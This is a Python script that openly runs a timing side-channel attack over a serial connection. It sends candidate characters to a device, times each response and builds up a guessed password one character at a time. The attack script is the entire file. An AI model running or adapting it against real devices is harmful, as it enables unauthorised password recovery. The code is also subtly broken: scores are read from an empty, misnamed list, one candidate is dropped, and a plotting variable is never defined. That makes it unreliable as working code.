import serial
import time

import matplotlib.pyplot as plt
import numpy as np

# Define the serial port and baud rate
serial_port = '/dev/tty.usbserial-0001'  # Adjust the port according to your system (e.g., COM1 for Windows)
baud_rate = 9600

# Establish serial communication
ser = serial.Serial(serial_port, baud_rate)

character_str = "xabcdefghijklmnopqrstuvwxyz"
parallel_chars = list(character_str)
characters = list(character_str)

ser.write("test".encode('utf-8') + b'\n')
print("starting the attack ....")
time.sleep(1)

measure_vector_out = []

def prepend(prefix, list_array):
    output = []
    for i in range(0, len(list_array) - 1):
        output.append(prefix + list_array[i])
    return output

def measure(characters_set):
    time_log = []
    try:
        for character in characters_set:

            start_time = time.time()
            ser.write(character.encode('utf-8') + b'\n')
            
            try:
                data = ser.readline().decode()
                # print(data)
                    
                end_time = time.time()
            
                elapsed_time = end_time - start_time
                time_log.append(elapsed_time)
                # print(elapsed_time, end=": ")
                # print(character)

            except UnicodeDecodeError as e:
                ser.write("test".encode('utf-8') + b'\n')
                data = ser.readline().decode()
                time_log.append(0.0)
                # print("skipped")
                # print(character)
                # print(data)

    except KeyboardInterrupt:
        print("Keyboard Interrupt. Exiting...")
        ser.close()  # Close the serial port when program exits
    return time_log
    
def calculate(characters):
    while True:
        measured_vector_out = []
        repeats = 10 
        for i in range(0, repeats):
            measured_vector_out.append(measure(characters))
            print("Progress: ", end="")
            print(i * 100 / repeats, end="%\r")

        # character_list = list(characters)
        time_measurements = np.arange(len(characters))

# for time_measurements in measure_vector_out:
            # plt.plot(character_list, time_measurements, marker='o', linestyle='-')

        listing = []
        for i in range(0, 27):
            multi = 1 
            for list in measure_vector_out:
                if list[i] == 0:
                    pass
                multi = multi * list[i]
            listing.append(multi)

        print("possible char: ", end="")
        index_max = listing.index(max(listing))     # Maximum Index is present here
        guess = characters[index_max]               # passw is the guess that scored 
        print(characters[index_max])

        characters = prepend(guess, parallel_chars)                  # prepend passw + alphabets
        # print(characters)

calculate(characters)

plt.plot(character_list, listing, marker='o', linestyle='-')


plt.title('Time vs Character Measurement')
plt.xlabel('Character')
plt.ylabel('Time Measurement')

# Show the plot
plt.grid(True)
plt.show()
